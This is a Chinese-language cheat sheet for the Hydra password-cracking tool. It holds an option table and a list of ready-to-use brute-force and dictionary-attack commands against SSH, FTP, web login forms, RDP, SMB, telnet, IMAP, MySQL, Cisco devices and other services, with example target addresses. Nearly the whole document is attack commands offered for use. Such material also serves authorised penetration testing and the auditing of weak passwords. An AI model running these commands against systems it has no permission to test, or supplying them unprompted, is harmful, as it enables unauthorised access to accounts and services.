*语法*

> hydra [参数] IP 服务

---

*参数参考列表*
|参数|类型|服务|
|:---:|:---:|:---:|
|-R||还原以前中止或崩溃的会话|
|-S||使用SSL连接|
|-s|端口号|指定非默认端口|
|-I|用户名|使用登录名进行登录|
|-L|文件|使用账号字典进行破解|
|-p|密码|使用密码进行登录|
|-P|文件|使用密码字典进行破解|
|-x||MIN:MAX:CHARSET密码暴力生成|
|-y||禁用在蛮力中使用符号|
|-r||随机密码生成|
|-e|n/s/r|n:空密码破解 s：使用的user作为密码破解 r：反向登录|
|-u||循环用户|
|-C|文件|指定所用格式为"user:password"字典文件|
|-M|文件|指定破解的目标文件，如果不是默认端口，后面跟上"**:** port"|
|-o|文件|将破解成功的用户名：密码写入指定文件|
|-b|格式|指定文件类型(txt (default)，json，jsonv1)|
|-f/F||在找到用户名或密码时退出( -f 每个主机  -F 主机文件)|
|-t||设置每个目标并行连接数(默认为16)|
|-T||任务总体的并行连接数（默认为64）|
|-w/W||设置超时时间(默认为32秒) 每个线程之间连接等待时间(默认为0)|
|-c||TIME所有线程每次登录尝试的等待时间(强制执行-t 1)|
|-4/6||使用IPv4(默认)/ IPv6地址|
|-v/V/d||详细模式 / 显示login+pass 每个尝试 /  调试模式|
|-O||使用老版本SSL V2和V3|
|-K||不重做失败的尝试|
|-q||不输出连接错误信息|
|-U||查看 支持破解的服务和协议|
|-m||特定模块的OPT选项，详细信息参见-U output|
|-h||帮助|

___

*常用破解命令*

#### SSH 破解

> hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh  
> hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh

#### FTP 破解

> hydra [ftp://ip](ftp://ip/) -l 用户名 -P 密码字典 -t 线程(默认16) -vV  
> hydra [ftp://ip](ftp://ip/) -l 用户名 -P 密码字典 -e ns -vV

#### Web 登陆破解，GET 方式

> hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/  
> hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php

#### Web 登陆破解，POST 方式

> 1.  `hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"`
> 2.  `hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:wrong username or password"`  
>     （参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,

#### HTTPS 破解

> hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https

#### eamspeak 破解

> hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak

#### cisco 破解

> hydra -P pass.txt 10.36.16.18 cisco  
> hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable

#### SMB破解
> hydra -l administrator -P pass.txt 10.36.16.18 smb

#### POP3 破解

> hydra -l muts -P pass.txt my.pop3.mail pop3

#### rdp（远程桌面） 破解

> hydra ip rdp -l administrator -P pass.txt -V

#### http-proxy 破解

> hydra -l admin -P pass.txt http-proxy://10.36.16.18

#### telnet 破解

> hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V

#### imap 破解

> hydra -L user.txt -p secret 10.36.16.18 imap PLAIN  
> hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN

#### MySql破解

> hydra -l root –p pass.txt –e ns 127.0.0.1 mysql




